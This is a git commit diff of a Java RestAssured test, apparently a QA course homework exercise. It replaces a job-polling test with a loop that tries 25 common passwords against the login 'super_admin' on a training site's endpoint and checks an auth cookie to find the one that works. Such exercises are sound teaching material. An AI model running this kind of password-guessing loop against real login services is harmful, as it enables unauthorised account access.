30875b399d87fc5fc91abf187e596d6ce25415ad
Zhikina <Swan2489@gmail.com>
2026-07-29 18:24:06 +0300

    EX_9

--- src/test/java/HelloWorldTest.java
+++ src/test/java/HelloWorldTest.java
@@ -2,49 +2,60 @@ import org.junit.jupiter.api.Test;
 import io.restassured.RestAssured;
 import io.restassured.response.Response;
 
-import static org.junit.jupiter.api.Assertions.assertEquals;
-import static org.junit.jupiter.api.Assertions.assertNotNull;
+
 
 
 public class HelloWorldTest {
     @Test
-    public void testHelloWorld()  throws InterruptedException {
-        String testUrl = "https://playground.learnqa.ru/api/longtime_job";
+    public void testHelloWorld() {
 
-        Response response = RestAssured
-                .given()
-                .get(testUrl)
-                .andReturn();
-
-        String token = response.jsonPath().getString("token");
-        int seconds = response.jsonPath().getInt("seconds");
+        String login = "super_admin";
 
 
-        Response notReadyResponse = RestAssured
-                .given()
-                .queryParam("token", token)
-                .get(testUrl)
-                .andReturn();
+        String[] passwords = {
+                "123456", "password", "12345678", "qwerty", "12345",
+                "123456789", "football", "1234", "1234567", "baseball",
+                "welcome", "1234567890", "abc123", "111111", "1qaz2wsx",
+                "dragon", "master", "monkey", "letmein", "login",
+                "princess", "qwertyuiop", "solo", "passw0rd", "starwars"
+        };
 
 
-        String statusBefore = notReadyResponse.jsonPath().getString("status");
-        assertEquals("Job is NOT ready", statusBefore);
-
-        Thread.sleep(seconds * 1000L);
-
-        Response readyResponse = RestAssured
-                .given()
-                .queryParam("token", token)
-                .get(testUrl)
-                .andReturn();
+        for (String password : passwords) {
 
 
-        String statusAfter = readyResponse.jsonPath().getString("status");
-        assertEquals("Job is ready", statusAfter);
+            Response authResponse = RestAssured
+                    .given()
+                    .param("login", login)
+                    .param("password", password)
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
 
 
-        String result = readyResponse.jsonPath().getString("result");
-        assertNotNull(result, "Поле result не должно быть null");
+            String authCookie = authResponse.getCookie("auth_cookie");
+
+
+            Response checkResponse = RestAssured
+                    .given()
+                    .cookie("auth_cookie", authCookie)
+                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+
+
+            String responseBody = checkResponse.getBody().asString();
+
+
+            if (!responseBody.equals("You are NOT authorized")) {
+                System.out.println("\n Задание выполнено!!!");
+                System.out.println("Логин: " + login);
+                System.out.println("Пароль: " + password);
+                System.out.println("Ответ сервера: " + responseBody);
+                return;
+
+
+            }
+
+        }
 
     }
 }
